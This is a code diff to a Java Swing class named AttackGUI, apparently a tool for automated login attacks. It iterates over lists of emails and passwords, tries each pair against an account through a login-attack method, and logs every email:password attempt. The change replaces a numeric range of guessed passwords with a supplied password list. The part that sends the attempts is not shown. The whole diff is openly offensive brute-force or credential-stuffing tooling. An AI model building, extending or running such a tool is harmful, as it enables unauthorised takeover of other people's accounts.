@@ -17,12 +17,9 @@ public class AttackGUI extends JFrame {
 
     private List<String> emails;
     private List<String> passwords;
-    private int i = 0;
+    private int i = 0, j = 0;
     private boolean isRunning = false;
     private DecimalFormat dcf = new DecimalFormat("###.###");
-    private long head = 950000000L;
-    private long tail = 990000000L;
-    private long j = head;
     private int index = 0;
 
     public AttackGUI(List<String> emails,
@@ -105,19 +102,20 @@ public class AttackGUI extends JFrame {
 
     private void processAttack() {
         isRunning = true;
-        if (i >= emails.size() && j > tail) {
+        if (i >= emails.size() - 1 && j >= passwords.size() - 1) {
             writeLog("Finish attack...");
+            JOptionPane.showMessageDialog(null, "Thread " + (index + 1) + " finish");
             timer.cancel();
             return;
         }
-        if (j > tail) {
-            j = head;
+        if (j >= passwords.size()) {
+            j = 0;
             i++;
         }
 
-        if (i < emails.size() && j < tail) {
+        if (i < emails.size() && j < passwords.size()) {
             double emailPercent = i * 1.0 / (emails.size() - 1) * 100;
-            double passwordPercent = j * 1.0 / (tail - 1) * 100;
+            double passwordPercent = j * 1.0 / (passwords.size() - 1) * 100;
 
             progressEmail.setValue((int) emailPercent);
             progressEmail.setString(dcf.format(emailPercent) + "%");
@@ -126,7 +124,7 @@ public class AttackGUI extends JFrame {
             progressPassword.setString(dcf.format(passwordPercent) + "%");
 
             String email = emails.get(i);
-            String password = "0" + j;
+            String password = passwords.get(j);
             writeLog(email + ":" + password + " [" + (j + 1) + "]");
 
             attackUsingEmailAndPassword(email, password);
@@ -170,9 +168,9 @@ public class AttackGUI extends JFrame {
             x = index * 500;
         } else {
             y = 500;
-            x = index / 2 * 500;
+            x = index == 3 ? 0 : index / 2 * 500;
         }
-        System.out.println(index + " || " + x + ":" + y);
+//        System.out.println(index + " || " + x + ":" + y);
         this.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
         this.setLocation(x, y);
         this.setVisible(true);
